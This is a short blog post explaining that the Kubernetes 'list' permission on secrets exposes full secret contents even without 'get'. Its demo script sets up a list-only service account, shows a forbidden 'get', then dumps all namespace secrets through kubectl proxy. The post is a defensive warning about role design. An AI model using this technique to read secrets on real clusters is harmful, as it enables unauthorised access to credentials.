---
layout: post
title:  "Why LIST is a scary permission on Kubernetes"
date:   2022-07-21 19:00:00
categories: [Kubernetes, APIs]
---
# Why LIST is a scary permission on Kubernetes

The list response contains all items in full, not just their name. This means the `list` permission should never be given to a role that doesn't already have the `get` permission.

## Example misuse

```bash

# Create example A, which can only list secrets in the default namespace
# It does not have the GET permission
kubectl create serviceaccount only-list-secrets-sa
kubectl create role only-list-secrets-role --verb=list --resource=secrets
kubectl create rolebinding only-list-secrets-default-ns --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa
# Now to impersonate that service account
kubectl proxy &
# Create a secret to get
kubectl create secret generic abc
# Prove we cannot get that secret
curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets/abc -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-list-secrets-sa")| .data.token' | tr -d '"' | base64 -d)"
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
  },
  "status": "Failure",
  "message": "secrets \"abc\" is forbidden: User \"system:serviceaccount:default:only-list-secrets-sa\" cannot get resource \"secrets\" in API group \"\" in the namespace \"default\"",
  "reason": "Forbidden",
  "details": {
    "name": "abc",
    "kind": "secrets"
  },
  "code": 403
}
# Now to get all secrets in the default namespace, despite not having "get" permission
curl http://127.0.0.1:8001/api/v1/namespaces/default/secrets?limit=500 -H "Authorization: Bearer $(kubectl -n default get secrets -ojson | jq '.items[]| select(.metadata.annotations."kubernetes.io/service-account.name"=="only-list-secrets-sa")| .data.token' | tr -d '"' | base64 -d)"
{
  "kind": "SecretList",
  "apiVersion": "v1",
  "metadata": {
    "selfLink": "/api/v1/namespaces/default/secrets",
    "resourceVersion": "17718246"
  },
  "items": [
  REDACTED : REDACTED
  ]
}
# Cleanup
kubectl delete serviceaccount only-list-secrets-sa
kubectl delete role only-list-secrets-role --verb=list --resource=secrets
kubectl delete rolebinding only-list-secrets-default-ns --role=only-list-secrets-role --serviceaccount=default:only-list-secrets-sa
kubectl delete secret abc
# Kill backgrounded kubectl proxy
kill "%$(jobs | grep "kubectl proxy" | cut -d [ -f 2| cut -d ] -f 1)"
```